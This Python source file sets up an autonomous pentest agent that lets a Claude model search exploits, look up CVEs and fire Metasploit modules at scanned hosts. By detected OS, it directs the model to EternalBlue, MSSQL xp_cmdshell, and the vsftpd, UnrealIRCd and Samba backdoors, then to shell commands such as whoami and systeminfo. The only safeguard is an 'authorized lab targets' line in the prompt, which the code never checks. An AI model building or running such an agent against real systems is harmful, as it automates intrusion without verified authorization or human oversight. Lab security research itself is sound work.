import os
from dotenv import load_dotenv
from langchain_anthropic import ChatAnthropic
from langchain_core.tools import tool
from langgraph.prebuilt import create_react_agent

from tools.retriever import search_exploits
from tools.cve_lookup import lookup_cve
from tools.msf_exec import parse_and_run

load_dotenv()

@tool
def search_exploits_tool(query: str) -> str:
    """Search the exploit knowledge base for attack techniques. Input: service name and version like 'vsftpd 2.3.4' or 'ms17-010 windows smb'."""
    return search_exploits(query)

@tool
def lookup_cve_tool(keyword: str) -> str:
    """Look up CVEs for a product using NIST NVD. Input: product name and version like 'vsftpd 2.3.4' or 'Microsoft SQL Server 2017'."""
    return lookup_cve(keyword)

@tool
def run_exploit_tool(json_input: str) -> str:
    """
    Run a Metasploit exploit module against the target.
    Input: JSON string with module, options, and _os_hint.
    
    Linux example:
    {"module": "exploit/unix/ftp/vsftpd_234_backdoor", "options": {"RHOSTS": "192.168.211.128"}, "_os_hint": "linux"}
    
    Windows example:
    {"module": "exploit/windows/smb/ms17_010_eternalblue", "options": {"RHOSTS": "10.129.95.187"}, "_os_hint": "windows"}
    
    Only use against authorized lab targets.
    """
    return parse_and_run(json_input)

tools = [search_exploits_tool, lookup_cve_tool, run_exploit_tool]

llm = ChatAnthropic(
    model="claude-sonnet-4-6",
    api_key=os.getenv('ANTHROPIC_API_KEY'),
    max_tokens=4096
)

agent = create_react_agent(llm, tools)

def detect_os(targets: list) -> str:
    """Detect OS from nmap scan results."""
    windows_keywords = [
        'windows', 'microsoft', 'ms-sql', 'iis', 'rdp',
        'microsoft-ds', 'netbios', 'msrpc'
    ]
    for target in targets:
        for svc in target.get('services', []):
            product = svc.get('product', '').lower()
            service = svc.get('service', '').lower()
            version = svc.get('version', '').lower()
            combined = product + service + version
            if any(kw in combined for kw in windows_keywords):
                return 'windows'
    return 'linux'

def run_agent(targets: list) -> str:
    os_hint = detect_os(targets)

    if os_hint == 'windows':
        os_specific = """
WINDOWS TARGET GUIDANCE:
- Try MS17-010 EternalBlue first if SMB (445) is open
- Try MSSQL xp_cmdshell if SQL Server (1433) is open
- Use _os_hint: "windows" in all run_exploit_tool calls
- Use module: exploit/windows/smb/ms17_010_eternalblue for EternalBlue
- Use module: exploit/windows/mssql/mssql_payload for MSSQL
- After getting a shell try: whoami, ipconfig, systeminfo
"""
    else:
        os_specific = """
LINUX TARGET GUIDANCE:
- Try vsftpd 2.3.4 backdoor first if FTP (21) is open
- Try UnrealIRCd backdoor if IRC (6667) is open
- Try Samba usermap_script if SMB (139/445) is open
- Use _os_hint: "linux" in all run_exploit_tool calls
- After getting a shell try: id, whoami, uname -a
"""

    task = f"""You are a penetration testing agent operating against authorized sandboxed lab targets only.

Target profile:
{targets}

Detected OS: {os_hint.upper()}

{os_specific}

For each open service:
1. Search for relevant exploit techniques using search_exploits_tool
2. Look up CVEs using lookup_cve_tool
3. Attempt exploitation using run_exploit_tool with the correct _os_hint: "{os_hint}"
4. Record what worked and what did not

Example run_exploit_tool input for this target:
{{"module": "exploit/{'windows/smb/ms17_010_eternalblue' if os_hint == 'windows' else 'unix/ftp/vsftpd_234_backdoor'}", "options": {{"RHOSTS": "{targets[0]['ip'] if targets else 'TARGET_IP'}"}}, "_os_hint": "{os_hint}"}}

Only target the IPs listed above. Begin your assessment now.
"""
    result = agent.invoke({"messages": [{"role": "user", "content": task}]})
    return result['messages'][-1].content
